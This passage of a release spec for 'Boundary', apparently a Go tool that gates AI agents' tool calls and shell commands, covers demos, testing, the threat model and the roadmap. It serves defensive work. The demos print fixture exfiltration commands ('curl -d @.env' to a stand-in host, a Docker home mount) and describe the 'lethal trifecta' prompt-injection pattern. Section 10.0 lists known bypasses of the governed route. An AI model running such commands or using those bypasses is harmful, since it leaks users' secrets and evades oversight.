| It does not produce **signed / cryptographically-proven** records | Records are **hash-verifiable**; the signer is unwired; default records unsigned | §6.2, `BND-CLAIM-002/005`, C6 |
| It does not **prove production deployment safety** | Deployment isolation, credential custody, policy quality, operator config remain operational | `PROOF_BOUNDARY.md`; `BND-CLAIM-006` |
| It does not **govern non-routed paths** | Routed-only: direct-PATH binaries, CI/SSH/editor terminals, arbitrary routes are known bypasses | C9; `BND-CLAIM-CMD-001`, `BND-CLAIM-EDIT-001` |
| It is **not a SQL firewall** / does not **prevent all SQL injection** | A Postgres AST guard classifies statements; classification ≠ a firewall | `BND-CLAIM-004` (`false`), `BND-CLAIM-008` |
| It does not **prevent every prompt injection / block all attacks** | Fixture redteam proves **tested deny paths only** | `BND-CLAIM-014` forbidden |
| Generated policies are **starter, not production-complete** | Operator review required | `BND-CLAIM-012` (`starter`) |
| Discovery does **not protect** discovered servers or mutate configs | Inventory is read-only; protection begins only after install/routing | `BND-CLAIM-011` |
| The version command does **not prove supply-chain / binary integrity** | Local metadata output only | `BND-CLAIM-UTIL-001` |
| Dashboard / doctor / evidence bundle do **not prove** every route is protected | `local-only` visibility, not runtime enforcement | `BND-CLAIM-016/UTIL-003/UTIL-004` |
| Secure GitHub is **preview, not production** | Preview fixture proof ≠ live conformance; bypass proof still required | `BND-CLAIM-015/018`, `BND-CLAIM-019` (`partial`) |
| Managed Agents is **preview** | Production needs a recorded live upstream conformance run | `BND-CLAIM-007` (`partial`) |

## 7.6 R1 — "Boundary decides," never "Fulcrum decides" (truth-discipline record)

"Boundary decides" subject discipline (R1) is preserved throughout; "Fulcrum" appears only in the module path, the proofs-correspondence lineage, and as the upstream owner of `proved`/`human_approved` modes. The three former "Fulcrum decides" residues (`docs/LANGUAGE_SYSTEM.md` lines 11 & 18 and `docs/PUBLIC_RELEASE_COPY.md` line 70) are **reconciled** — those files now read "Boundary decides"; the only remaining occurrences of the phrase are the governed quotes in this language-control spec (R1 rule, §2.1/§7.6). *superseded: those three "Fulcrum decides" instances.* The release-surface precision items remain done in the current tree: the public-surface guard covers every tracked text file (§7.1 Gate 3); `CITATION.cff` is corrected to the release version (`0.9.0`, resolving the earlier `0.2.0` drift; briefing B-3); the no-package-manager/hosted sweep is reflected in copy (§7.4); the receipt-vs-decision-record term is reconciled to "decision record (hash-verifiable)" (§6.1/§6.3); and README test-count precision is handled by carrying no fragile count in the README (§9). No item from this set remains open.

---

# 8. Quickstart & Demos

> The command shapes below are fixture-only, no-credential, no-network, and
> no-live-mutation paths. Current release verification re-runs the key commands
> through `make release-check`; full transcripts and examples live in the demo
> docs.

## 8.0 What you get, in one screen

Boundary is a single Apache-2.0 Go module (Go 1.25+) installed with one `go install`. There is **no daemon to run for first value**. The mental model is three beats — **see → decide → prove**:

- **See** — discover the MCP tools your agents are wired to and render the dangerous paths. *(MCP inventory/graph; selftest checks `inventory_fixture_loads`, `risk_graph_fixture_renders`.)*
- **Decide** — `allow | deny | warn | escalate | require_approval` **before execution**, fail-closed by default. *(`governance/pipeline.go`, `tests/integration/`.)*
- **Prove** — emit a **hash-verifiable decision record** (`DecisionRecordV1`: `record_id`, `decision_hash = sha256:…`). It is **not** "cryptographic proof of verdict" — no signing ships; `signature`/`signature_key_id` exist in the schema but are empty by default. *(C6; `governance/receipt.go`, `tests/receipt_verification_test.go`.)*

## 8.1 The verified < 5-minute path (Lane 1: MCP, the first production route)

Requires Go 1.25+ and a C toolchain on `PATH` (the SQL classifier links `pganalyze/pg_query_go` via cgo). Distribution is **local + `go install` only** (C10).

```bash
go install github.com/fulcrum-governance/fulcrum-boundary/cmd/boundary@v0.9.0
boundary selftest                       # 10 no-credential local checks (verified 10/10)
boundary demo github-lethal-trifecta    # fixture-only: no creds, no GitHub calls, no mutation
```

**`boundary selftest`** — verified 10/10; the load-bearing lines (full output in the selftest doc):

```text
status: pass   |   live mutation: none   |   credentials: none   |   network: none
[pass] inventory_fixture_loads          - 1 GitHub MCP fixture, high-risk capabilities, redacted env
[pass] risk_graph_fixture_renders       - 4 risk paths including repo-write paths
[pass] descriptor_lock_detects_drift    - modified descriptor → drift + default-deny
[pass] redteam_github_lethal_trifecta   - write-after-taint fixture denied before upstream
[pass] secure_github_live_mode_fails_closed - live GitHub App mode rejected without credentials
[pass] decision_record_emitted          - record rec_… emitted with sha256:…
```

**`boundary demo github-lethal-trifecta`** — the first production route's hero demo; untrusted GitHub content taints the session, then a private-repo write is **denied before upstream execution**. Verified live (essential lines):

```text
status: pass   |   fixture-only: true   |   credentials/network/live-mutation: none
expected action: DENY   |   actual action: DENY   |   reason: lethal_trifecta_detected
matched rule: deny-github-write-after-taint-fixture
upstream_called=false   |   read_upstream_called=true
decision record: rec_…   |   decision hash: sha256:…
Checks: [pass] write_denied_before_upstream: upstream_called=false; [pass] decision_record_emitted
```

The read step **does** reach the fixture upstream (`read_upstream_called=true`) to establish taint; the later **write** is denied (`upstream_called=false`) — the boundary fires *before* the dangerous action. Machine-readable: append `--json`. Markdown + local dashboard: `--markdown --out demo-report.md --dashboard` (dashboard reads local artifacts only — **not** hosted monitoring; C10).

**What this lane proves / does NOT prove** *(status + evidence):*

| Scope | Status | Proof shown by the local fixture | Evidence |
|---|---|---|---|
| Inventory | `delivered` | Reads a fixture MCP config, lists reachable tools. | selftest `inventory_fixture_loads` |
| Risk graph | `delivered` | Connects untrusted GitHub context to a private-repo mutation path. | selftest `risk_graph_fixture_renders` |
| Starter policy | `starter` | Generates local starter policies that parse through the verifier. | `boundary policy generate`; `boundary verify` |
| Secure GitHub deny | `delivered-preview` | Denies the tested write-after-taint fixture **before** GitHub is touched. | `internal/redteam` `github-lethal-trifecta` |
| Decision record | `delivered` | Records the verdict + reason for the governed route; hash-verifiable. | `governance/receipt.go` |

- Does **not** prove **live GitHub App conformance** — Secure GitHub stays `preview` until deployment-bypass evidence + broader live coverage are recorded.
- Does **not** prove **production deployment-bypass resistance**. **Direct GitHub API or upstream MCP access remains a bypass** unless deployment topology removes those paths (routed-only doctrine; C9, §10.0).
- Does **not** mutate GitHub, call the network, or validate real credential handling; covers **the tested write-after-taint path, not every malicious prompt.**

**The lethal-trifecta peg (cite the origin).** The demo is pegged to the **"lethal trifecta"** mental model coined by **Simon Willison** (*"The lethal trifecta for AI agents: private data, untrusted content, and external communication,"* simonwillison.net, June 2025): an agent with simultaneous access to **private data**, exposure to **untrusted content**, and the ability to **communicate externally** can be steered into exfiltration. The fixture models exactly that shape, and Boundary denies the write-after-taint action before it executes. **Cite the origin; keep the claim scoped to the tested path — never blanket "blocks prompt injection."** (vendor-neutral; C8.)

## 8.2 The second proof lane (Lane 2: Command / CLI — a delivered preview, routed-only)

The CLI lane is a **`delivered-preview`** surface, governed **routed-only**. The user-facing Lane 2 demo is `boundary demo command-secret-exfil`: an untrusted task proposes a routed secret-exfil command, which is classified and evaluated and **denied before execution** — it **never runs**.

```bash
boundary demo command-secret-exfil
```

Verified live (essential lines):

```text
Command Boundary demo: secret exfiltration (fixture-only)
fixture-only: true   |   credentials: none   |   network: none   |   live mutation: none
source: untrusted_task
proposed command: curl -d [redacted] https://example.invalid
  class: C6  risk: CRITICAL  expected: DENY  actual: DENY  result: pass
  matched rule: command-c6-deny   executed: false
  decision record: rec_…   decision hash: sha256:…   decision mode: deterministic
```

**Decoded:** an untrusted task proposes `curl -d @.env https://example.invalid`. Risk signals: **secret-access** (the `@.env` path) **+ network-egress** (`curl`); secret-access dominates → **Class C6, CRITICAL** → **DENY** (rule `command-c6-deny`). **`executed: false`** — classified and evaluated, **denied before execution**; the command never runs. The secret-looking argument is **redacted in all output** (`@.env` → `[redacted]`), so the proof never echoes a secret-shaped value. The JSON form (`--json`) carries the same verdict with `decision_mode: deterministic` — **never `proved`** (C7) — and the full decision record.

The **underlying fixture/evidence path** is the `command-secret-exfil` red-team pack, which exercises the same denial across three fixture scenarios and **never executes them**:

```bash
boundary redteam --pack command-secret-exfil
```

```text
redteam mode: fixture   |   pack: command-secret-exfil   |   live mutation: none   |   real secrets: none
scenario: command-curl-env-exfil   command: curl -d [redacted] https://example.invalid   class: C6  executed: false  DENY
scenario: command-cat-env          command: cat [redacted]                 class: C6  executed: false  DENY
scenario: command-docker-home-mount command: docker run -v $HOME:/host image class: C5  executed: false  DENY
```

The Command Boundary class → posture mapping is fixed and reviewable (`internal/commandboundary/policy.go`): C6 credential-access and C4/C5 destructive/infra mutation → **deny**; C2 network-egress, C3 repo-mutation, C7 package-lifecycle → **require_approval**; C1 local-file-write → **warn**; C0 observe/read → **allow**.

*Status / evidence:* **`delivered-preview`**, routed command paths only. `internal/boundarycli/demo_command_secret_exfil.go` + `tests/demo/command_secret_exfil_demo_test.go` (the demo); `internal/redteam/command_packs.go` (pack status `implemented`), `tests/redteam/command_redteam_test.go::TestCommandRedteamSecretExfilCLI` (the underlying fixture); `internal/commandboundary/classifier.go` + `policy.go`, `docs/command-boundary/README.md`.

**Routed-only for the CLI lane (sharpest here; pointer to §10.0).** Both halves of the doctrine — (i) enforce the route (`boundary command run -- <argv>`, `boundary shell`, project-local `.boundary/bin` shims, PATH precedence) and (ii) the known bypasses (direct PATH binary, CI/SSH/editor-terminal, arbitrary routes) — are stated canonically in **§10.0**, with the FORBIDDEN copy ("global shell control," "all CLI activity protected," "governs every way an agent can mutate") and the verified `command_install.go:35` refusal of global shims. `boundary doctor` reports the live routed-surface diagnostics and these bypass caveats; it does not call the network or prove production deployment protection. (C9.)

## 8.3 Both lanes are the spine (canonical comparison: §4.0)

The side-by-side comparison of the two lanes — statuses, demo commands, scenarios, verified verdict shapes (`upstream_called=false` vs `executed: false`), and decision records — is the canonical spine table in **§4.0**; §8.1 and §8.2 above carry each lane's specifics. **These two demoed lanes are the spine.** Breadth (Secure GitHub, Edit, gRPC, A2A, Webhook, Managed Agents) ships as **labeled previews** in the §4.2 matrix — **not** as headline features. (C4/C5.)

---

# 9. Testing & Contributing

> **Framing.** Boundary's suite is the **reference standard** — the prior due-diligence audit's
> named "role model" repo. The point is not to argue "is it tested" (it is) but to give an external
> contributor a **frictionless, trustworthy first run** and to pre-empt one honest coverage-shape
> question. Source: `research/TEST_READINESS.md`; the current release gate
> re-runs the contributor-facing checks. The full gap ledger, PR template, and
> `docs/TESTING.md` outline live in `LAUNCH_BLOCKER_CHECKLIST.md`.

## 9.1 Testing architecture

Tests are **layered, not flat** (490 `func Test` across 106 `_test.go` files in the main module, plus the `adapters/grpc` submodule):

- **Co-located unit tests** — `*_test.go` next to the code across `governance/`, `policyeval/`, `interceptors/`, `adapters/*`, `internal/*`.
- **Black-box integration** — `_test` packages under `tests/` (16 subdirectories). Load-bearing fail-closed e2e: `TestMCPGateway_DeniedRequestNeverReachesUpstream`, `TestMCPGateway_FailClosedOnPipelineError`, `TestMCPBypassProbeFailsWhenDirectPathIsClosed`, `TestStandaloneBundleBootsWithoutExternalDependencies`.
- **Cross-transport parity** — `governance/parity_test.go` asserts **identical verdicts across MCP / CLI / other transports** for one pipeline config ("same policy, every transport, same verdict").
- **Adapter conformance + readiness** — `tests/adapter_conformance/` validates every `adapters/*/readiness.yaml`, enforces that `production` adapters have conformance evidence and **no `stub` steps**, and cross-checks README + `ADAPTER_READINESS_MATRIX.md`.
- **Red-team fixtures** — `internal/redteam/` + `tests/redteam/`: the `github-lethal-trifecta` deny pack, the **three command packs** (`command-overeager-cleanup`, `command-repo-mutation`, **`command-secret-exfil`**), and **eight edit diff fixtures**. Each asserts the expected `deny`/`require_approval`, asserts **nothing executed** (`Executed == false`) / nothing applied, no live mutation, no real secrets, and a decision record with `RecordID` + `DecisionHash`.
- **SQL evasion corpus** — `interceptors/sql/evasion_corpus/postgres.yaml` (32+ cases) replayed against the AST classifier, with a build-failing floor if the corpus shrinks.
- **The claims spine (the standout)** — `claims/claims_test.go` per-status enforcement (delivered → evidence-on-disk; partial → structured gaps; false → README guard), paired with `claims/language_lint_test.go`. The strongest QA-to-claims linkage in the estate.

**Determinism / flake posture (preserve it):** `-count=1` (no retries), **no `t.Parallel()`**, **no `//go:build` tags on test files** (every test compiles and runs every time), hermetic patterns (`t.TempDir`, `httptest`, in-process). The only `t.Skip`s are env-gated live conformance (`tests/conformance/secure_github`, `tests/conformance/managed_agents`) — 7 skips across 490 funcs. **Opt-in live testing, not disabled testing.**

## 9.2 Running the tests

```bash
go test ./... -count=1 -timeout 5m                 # fast path most contributors run
go test ./claims/... -count=1                       # the claims + language gate (run when you touch a claim or copy)
git ls-files '*.go' | xargs gofmt -l                # prints no paths when clean
go vet ./...
make release-check                                  # the full release gate CI enforces (§9.4)
```

> **Test-honesty gap G1 (do before public).** README/CONTRIBUTING document `go test ./... -short …`, but **zero `testing.Short()` guards exist** (verified). `-short` is a **silent no-op** — a careful contributor notices and loses trust. **Fix: drop `-short`** (the commands above are the corrected form; the suite runs well under 5 minutes). *superseded: the README/CONTRIBUTING blocks showing `-short`.*

## 9.3 The coverage number, explained once (so it is never mis-cited)

Aggregate statement coverage reads **43.8%**, and several security-critical packages read **0.0%** — `interceptors/sql`, `governance/kernel`, `adapters/managedagents`, plus `cmd/boundary`, `internal/doctor`, `internal/evidence`, `governance/standalone`. **This is a Go black-box-test *attribution artifact*, NOT under-testing**, confirmed by the prior audit. Those packages **are** exercised by external `_test`-package suites under `tests/` (`tests/interceptors/sql_*`, `tests/integration/` kernel tests, `tests/adapters/` + `tests/conformance/managed_agents`, `tests/cli_output/`, `tests/doctor/`, `tests/evidence/`). Because the tests live in a separate package, Go attributes coverage to the **external** package, so the **source** reads 0.0% — the number **understates** reality but **looks alarming** on a security tool.

**Guidance (locks the honesty posture):**
- **Do NOT ship a naive coverage badge** using 43.8%; do not let anyone cite "half untested."
- Make it legible **in-repo** via `docs/TESTING.md` (per-0.0%-package → covering black-box suite).
- Generate an honest profile when you want a real figure: `go test ./... -coverpkg=./... -coverprofile=cover.out`.
- Genuine **thin** spots worth a targeted unit pass (distinct from the artifact): `governance.Pipeline.Evaluate` (46.9% direct — the highest-complexity production function, so a refactor there carries regression risk) and `adapters/mcp` (13.3% direct). High-value insurance — **not** a launch blocker.

> The well-covered core is real: `interceptors` 94.3%, `policyeval` 85.8%, `adapters/codeexec` 85.1%, `adapters/cli` 81.4%, `adapters/webhook` 78.9%, `internal/selftest` 73.8%, `adapters/grpc` 74.0%.

## 9.4 What CI enforces (and what to witness before announcing)

`.github/workflows/ci.yml` on every PR/push to `main`: **`test`** (`go build`, `go vet`, `go test ./... -count=1 -race -cover` on Go **1.25.0 + 1.26.3**); **`grpc-adapter`** (nested module); **`lint`** (`golangci-lint`, pinned, gofmt formatter); **`security`** (**gosec + govulncheck, blocking**); **`public-surface`** (the Gate-3 guard); plus **CodeQL** (push/PR + weekly) and a strict mkdocs build. `scripts/release-check.sh` is the human-runnable superset that **runs the actual binary** through `verify`, `verify-record`, `version`, `selftest`, `demo github-lethal-trifecta`, `demo action-boundary`, `doctor --json`, `boundary test --path tests/fixtures/policy-test/cases`, and an `evidence bundle`→`verify` round-trip.

> **Launch checklist item (G3):** before announcing, **witness a green run on the public default branch** — all required checks across both Go versions, plus blocking gosec / govulncheck / CodeQL. README badges point at the public Actions and must not be red on day one.

## 9.5 Contributing

CONTRIBUTING.md already states the expectation (fork → branch from `main` → keep commits scoped to one lane → run local checks → describe what changed, why, and what verification you ran; Apache-2.0, **no CLA**). The two contributor artifacts called for here are present in the current tree:

- **G2 — `.github/pull_request_template.md`** (added; issue templates already existed). The template encodes the verification checklist (`make release-check`, `gofmt -l`, `go vet`, `go test ./...`, `go test ./claims/...`) and the **routed-only / fixture-only honesty gates**: no forbidden copy ("global shell control" / "all CLI activity protected" / "governs every way an agent can mutate" / "cryptographic proof of verdict" / any `proved` runtime decision); decisions stay `deterministic`/`classified`; records stay "hash-verifiable."
- **G8 — `docs/TESTING.md`** (added) covers the test architecture, how to add a red-team fixture / SQL evasion case, the claims-ledger contract, and the §9.3 coverage-attribution caveat.

## 9.6 Honest scope notes a first reader will probe

- **Red-team stubs are labeled at point of use (G5).** `boundary redteam --list` prints status per pack — the three command packs, the edit packs, and `github-lethal-trifecta` show **`implemented`**; `tool-poisoning`, `rug-pull`, `postgres-destruction`, `secrets-exfil`, `github-pr-exfil`, `filesystem-credential-read`, `slack-exfil` show **`stub`** (running a stub fails by design). Do not claim "red-team validated" for the stub classes; none are `delivered` in the ledger.
- **No fuzzing yet (G6, P1, not a blocker).** Zero `func Fuzz` (verified). Recommended fast-follow: `FuzzClassifyPostgres` seeded from the 32-case corpus, wired into CI/nightly.

> The complete §9 gap ledger (G1–G8 with priority and status) lives in `LAUNCH_BLOCKER_CHECKLIST.md`.

---

# 10. Limitations & Threat Model

> **Authoritative.** Grounds the *honest scope* of the current public release. This section is **a
> differentiator, not a disclaimer**: the "What Boundary Does NOT Prove" tables are the trust
> feature. **Copy subject is always "Boundary decides", never "Fulcrum decides"** (R1).
> **Vendor-neutral throughout** (C8). The complete release-readiness gate (B-1…B-4, G1–G8) is
> `LAUNCH_BLOCKER_CHECKLIST.md`.

## 10.0 The doctrine that governs every limit: ROUTED-ONLY (CANONICAL — locks C9)

**Stated explicitly and exclusively — this is the one canonical treatment of the routed-only
doctrine; §1.8, §3.5, §4.3, §6.4, §8.2 all cross-reference here:**

> **Boundary governs only what routes through it.** If an action does not pass through a Boundary route, Boundary does not see it, does not decide on it, and does not claim it.

This is the single load-bearing honesty of the product. It is sharpest for the CLI/Command lane, where the surrounding shell is full of un-routed paths. Boundary's value is real *on the route*; the route is not the whole world, and the spec says so on the front door.

- **Superseded:** any framing that Boundary provides "global shell control", that "all CLI activity is protected", or that Boundary "governs every way an agent can mutate". These are **forbidden copy** (`docs/RELEASE_TRUTH_COMMAND_BOUNDARY.md` "Forbidden Command Boundary Copy"; `docs/command-boundary/BYPASS_MODEL.md`). Position A ("broad control / governs every mutation") is retired.
- **Evidence:** README "Core Model" — *"Boundary governs actions only when the route is forced through Boundary."*; `docs/command-boundary/BYPASS_MODEL.md`; `docs/THREAT_MODEL.md` Attack Surface 1.

The doctrine has two operator-facing halves; **both** must be stated wherever the CLI lane is described:

### (i) How to ENFORCE the route — the governed modes (delivered-preview; verified in code)

| Mode | Invocation | Governed condition | Evidence |
|---|---|---|---|
| Explicit wrapper | `boundary command run -- git push origin main` | Handed directly to Boundary; classified + evaluated before `os/exec`, no shell interpolation. Prints `action=… executed=… record=…`; forwards only when allowed. | `internal/boundarycli/command_run.go:65`; `BND-CLAIM-CMD-001` |
| Project shell | `boundary shell [--project-root PATH]` | A subshell prepends project-local `.boundary/bin` to `PATH` **for the subshell only**; a command is governed **only if it has a shim**. Commands without shims remain outside Boundary even inside the subshell. | `internal/boundarycli/shell.go:23-25`; BYPASS_MODEL.md |
| Project shims + PATH precedence | `boundary command install --project` → `export PATH="$PWD/.boundary/bin:$PATH"` | Selected commands get a `.boundary/bin/<cmd>` shim calling `boundary command run -- <cmd> "$@"`. The route holds **only while `.boundary/bin` wins name resolution**. Reversible; **does not modify `~/.zshrc`/`~/.bashrc`/`~/.profile`/global `PATH` by default.** | `internal/boundarycli/command_install.go` (`:50` prints the export line) |

> **Global routing is refused by design.** `boundary command install` **rejects** global shim installation: `--project is required; global shim installation is not supported` (`command_install.go:35`). The product itself will not let an operator claim global shell control — the C9 doctrine enforced at the command surface, not merely documented. The MCP lane enforces its route differently — by topology, the gateway being the sole network path to the upstream (§10.1).

### (ii) The KNOWN BYPASSES that remain (stated, not hidden)

Limitations of the deployment model, **not product failures**; they must remain visible in public docs:

- **Direct PATH binary** — the real binary by absolute path (`/usr/bin/curl …`), or `git push` run directly when `.boundary/bin` is not first on `PATH`, executes outside Boundary.
- **Commands without an installed shim inside `boundary shell`** — the subshell governs only shimmed commands.
- **CI jobs, SSH sessions, cron jobs, launchd jobs, editor/terminal tasks** — outside Boundary unless that job *explicitly* routes through a Boundary route.
- **Local scripts / package-manager lifecycle scripts** that spawn subprocesses directly; **arbitrary processes** invoking commands or the upstream tool directly.
- **Direct tool calls** to the same MCP/tool endpoint when deployment topology does not remove the alternate path (§10.1).
- **Edit-side parallels** — direct editor writes, direct filesystem writes, direct `git apply`, shell redirection, IDE saves, CI jobs remain outside Boundary unless routed through Boundary edit envelopes. Boundary provides **no filesystem sandboxing**.

**Evidence:** `docs/command-boundary/BYPASS_MODEL.md` §Bypass Routes (verbatim); `docs/RELEASE_TRUTH_COMMAND_BOUNDARY.md` §Direct Shell Bypass Statement; README "What It Does Not Prove."

**Required public wording (use verbatim):** *Command Boundary governs commands only when the command routes through Boundary. Direct shell execution is a bypass. Global `PATH` outside Boundary is a bypass. CI jobs are bypasses unless explicitly routed through Boundary.* The full FORBIDDEN-phrase → replacement table is **§12.3**.

## 10.1 Trust boundaries (the MCP production lane)

The production surface is the MCP adapter (`adapters/mcp`). Its trust boundary is the gateway: **the gateway is the intended sole route between the agent and the privileged tool**, and every decision happens there, before execution.

- **In the fixture/demo topology** the agent can reach the gateway but **not** the upstream directly; that network design *makes* Boundary the pre-execution decision point — demonstrated, not asserted (`boundary demo github-lethal-trifecta`, `boundary demo postgres`; `BypassProbeFailsWhenDirectPathIsClosed`).
- **In production** the same sole-route constraint is **an infrastructure responsibility, not something Boundary can self-enforce**: firewall rules, service-mesh policy, Kubernetes network policy, or private networking must make the governed route the only route. Boundary states this rather than implying it provides the network control itself.
- **Status:** MCP adapter = `production`; sole-route *enforcement* in production = operator responsibility. **Evidence:** `docs/THREAT_MODEL.md` §Trust Boundary; `adapters/mcp/{adapter.go,gateway.go}`.

## 10.2 Attack surfaces (and what mitigates each)

Adapted from `docs/THREAT_MODEL.md`, kept claim-safe.

- **Surface 1 — Bypass (reaching the tool without routing through Boundary).** *Demo mitigation:* network topology — agent on the frontend network, upstream on the backend; the demo *proves* the agent cannot reach the upstream directly. *Production mitigation:* **deployment topology, not Boundary code** — the routed-only doctrine (§10.0) at the network layer. Status: demo-proven (`local-only` fixture); production = operator responsibility.
- **Surface 2 — Policy circumvention (evading the rules on the route).** *Mitigation:* **fail-closed by default** on security-critical transports; the pipeline emits the *true* verdict to audit exactly once, before any dry-run conversion. *Honest limit:* the launch policy uses **string/substring matching** for destructive-action blocking and demo-grade SQL rules (`DROP TABLE`, `DELETE FROM`, `TRUNCATE`, `ALTER TABLE`). **SQL comments, whitespace tricks, dialect-specific syntax, and semantic SQL analysis are out of scope unless explicitly covered by tests**; encoded/transformed payloads can evade. **Killed framing:** this is **not a "SQL firewall"** — `BND-CLAIM-004` = `false`, banned from public copy. Status: fail-closed = `delivered`; destructive-blocking policy = `starter`/demo-grade.
- **Surface 3 — Audit / decision-record tampering.** *Mitigation:* Boundary emits structured decision records (stdout / local JSONL); **production log integrity depends on the deployment's log pipeline** — forward to an external append-only sink the agent cannot reach. *Honest limit:* records are **hash-verifiable structured logs, not cryptographic receipts** (§6, §10.4). Status: decision records = `delivered`; tamper-resistance in production = operator responsibility.

## 10.3 What the demos prove — and explicitly do NOT prove (pointer to §4.0/§8)

The spine is **two demoed lanes** (canonical table §4.0; full walkthrough §8), each fixture-only. Breadth lives in the preview matrix (§10.5), never the headline (C4/C5).

- **Lane 1 — MCP (`production`): `boundary demo github-lethal-trifecta`.** **Proves:** discovery of the fixture MCP surface; the risk path from untrusted context to private-repo mutation; denial of the tested write-after-taint path before upstream (`upstream_called=false`); a hash-verifiable decision record. **Does NOT prove:** live GitHub App conformance; production deployment-bypass resistance; any real mutation/network/credential handling; universal GitHub safety — supports the **preview Secure GitHub** claim only (`BND-CLAIM-019`, `partial`). **Attribution (C8):** the "lethal trifecta" mental model is cited to its public origin; the claim stays scoped to the tested path; no competitor or vendor is named.
- **Lane 2 — Command/CLI (`delivered-preview`, routed-only): `boundary demo command-secret-exfil`** (underlying fixture/evidence path: `boundary redteam --pack command-secret-exfil`)**.** **Proves:** wrapper-routed commands are classified before execution; denied/approval-required commands **do not execute** (`executed=false`); allowed commands execute through `os/exec` without shell interpolation; records capture the decision without logging secret values; fixture packs demonstrate deny/require-approval without live mutation. **Does NOT prove (verbatim from `docs/command-boundary/DEMO.md`):** global shell control; CI control unless the job explicitly routes through Boundary; SSH control; coverage for every command path; protection for direct shell access; universal coding-agent safety; shell sandboxing. **Decoy-fixture honesty:** the exfil payload is synthetic (`BOUNDARY_FIXTURE_VALUE=redacted_fixture_value`; bootstrap targets `example.invalid`) — intentional benign test payloads, marked known-benign (B-4) so a first-clone secret-scanner false-positive does not read as a real leak.

## 10.4 Decision records & the proof boundary (pointer to §6)

The C6/C7 mechanics are canonical in §6; the threat-model-facing summary: **(C6)** Boundary emits **decision records** — structured, **hash-verifiable** records of each verdict — **NOT "cryptographic proof of verdict"** (no signing ships; tamper-resistance is a deployment property, §10.2 Surface 3). Use **"decision records (hash-verifiable; signed receipts not implied by default)."** **(C7)** Runtime decisions are **`deterministic`/`classified`**; Boundary **does not emit `proved`**; Lean 4 proofs are referenced by **correspondence only** (type `design`) — constraining the *shape* of behavior (the 0.30 isolation / 0.60 degraded bands; trust degrades on repeated failure; isolated/terminated agents denied before protected execution) but **not** proving any deployment is safe. **Evidence:** `docs/DECISION_RECORDS.md`, `docs/EVIDENCE_VERIFY.md`, `docs/PROOF_BOUNDARY.md`, `BND-CLAIM-UTIL-001..004` (`delivered`).

## 10.5 Per-surface maturity (the honest preview matrix — pointer to §4.2)

Only the MCP route is `production`; everything else is honestly labeled. **The spine is the two demoed lanes (§10.3); the per-surface rows are NOT headline features.** The authoritative per-surface table (every adapter, its status, the lifecycle gap, and the ledger anchor) is canonical in **§4.2** and is not restated here; promotion to `production` is uniformly gated on **deployment-bypass proof** (§11.1).

- **Distribution limit (C10):** install is **local + `go install …/cmd/boundary@v0.9.0` only.** No hosted-monitoring, Homebrew, or other package-manager claims. The dashboard reads local artifacts only.

## 10.6 Out of scope for this release (stated plainly)

Boundary does **not** claim, and public copy must not imply: **global shell / system control**, "all CLI activity protected", or "governs every way an agent can mutate" (C9); a **general SQL firewall** or semantic SQL analysis (`BND-CLAIM-004` = `false`); a **universal prompt-injection / "blocks every attack"** defense (fixtures cover *tested* paths only); a **formal-verification product** (proofs are correspondence-only, never the hook — C7); **hosted monitoring or cloud analysis** (local-first; C10); **production status for any non-MCP adapter** (all others preview/starter/local-only pending deployment-bypass proof); **cryptographic receipts / signed proof of verdict** (records are hash-verifiable logs — C6); **the standalone↔kernel contract as a shipped integration** (kernel mode is a documented contract surface only — C3, §10.7).

## 10.7 Standalone posture & the kernel contract surface (locks C3 — proof in §5)

**Stated explicitly and exclusively:** the release ships a **standalone OSS tool with ZERO private-repo dependency** (the offline-build + empty-graph proof and the no-runtime-Fulcrum-call evidence are canonical in §5.2–§5.3). Kernel mode (Redis / Fulcrum API / NATS-backed policy, trust, budget, escalation, audit) is a **documented contract surface only** — `BND-CLAIM-010`, `status: delivered` as a *contract definition* — **not** a shipped, network-connected integration in this release; it **fails hard on incomplete configuration** by design. The `policyeval` fork *enables* standalone buildability and its cross-repo drift is a future maintenance item (§11.2), explicitly **not** to be "fixed" by coupling the OSS repo to the private repo. *superseded: "Boundary is the out-of-process enforcement boundary of the Fulcrum kernel (requires Redis/NATS/fulcrum-io)" as the release identity — Position A retired.* **Evidence:** `CROSS_REPO_DEPS.md`; `docs/STANDALONE_VS_KERNEL.md`.

---

# 11. Roadmap (future direction)

> **Everything in Section 11 is DIRECTION, NOT A CLAIM.** None of it may appear in public copy as
> a current capability, and none of it carries a `delivered`/`production` status. The honest preview
> matrix (§4.2/§10.5) is the present tense; this is the future tense.

## 11.1 Adapter promotion to `production` — via deployment-bypass proof
Every preview adapter (Secure GitHub, Command, Edit, gRPC, A2A, CodeExec, Webhook, Managed Agents) has the **same uniform gate: deployment-bypass proof** — evidence that the Boundary route is the *only* relevant route for the protected workflow. Per `docs/command-boundary/BYPASS_MODEL.md` and each `readiness.yaml`: operators intentionally route protected actions through Boundary; shell/shim (or topology) setup is reproducible and reversible; direct bypass paths are blocked by environment policy or documented out of scope; decision records exist for routed attempts; tests prove denied actions do not execute **and** allowed actions execute exactly once; bypass limitations are documented in release truth. Promotion order is demand-led — **not a dated roadmap.**

## 11.2 Maintenance — `policyeval` de-fork
Boundary's `policyeval/` and the private control plane's copy are independent and have drifted. For a standalone OSS tool this divergence is *correct posture today* but a standing **maintenance liability** (a policy-semantics fix in one tree does not propagate). The de-fork (a shared, public, contract-tested core, or a documented one-way sync) is a **future maintenance item — not a release blocker**, and explicitly **not** to be resolved by coupling the OSS repo to the private repo.

## 11.3 Hardening the policy/evasion surface
Move destructive-action blocking beyond substring matching toward parse-based classification on the CGO SQL path; widen the evasion corpus; add fuzzing (`FuzzClassifyPostgres` + per-adapter parser fuzz). This *narrows* Surface 2 (§10.2) over time; it does **not** retroactively support a "SQL firewall" claim (that framing stays killed).

## 11.4 Expansion (demand-gated)
Broader MCP-client discovery; more starter-policy templates; richer local dashboard views over local artifacts (still **local-only** — no hosted monitoring without an explicit, separately-scoped decision that revisits C10). The "adapter is the business model" expansion is retained as **strategy and future direction** — not a current release surface.

## 11.5 Optional integrity upgrade
Signed decision records / tamper-evident receipts would upgrade Surface 3 (§10.2) from "depends on your log pipeline" to in-artifact tamper-evidence. **Not shipped**; until then, copy stays "decision records (hash-verifiable)", never "cryptographic proof of verdict" (C6).

---

# 12. Appendix: Lexicon & Forbidden Language

> Definitions are canonical in `docs/LEXICON.md`; the forbidden list consolidates
> `docs/RELEASE_TRUTH_PUBLIC.md` "Forbidden Release Language" (the tie-breaker authority),
> `docs/COPY_RULES.md`, and the per-claim `forbidden` arrays in `claims/boundary_claims.yaml`
> (advisory; integrity- and lint-sync-checked by `claims/forbidden_test.go` — only forbidden phrases
> that double as hardcoded `language_lint_test.go` terms are CI-enforced in public copy; see §7.1).
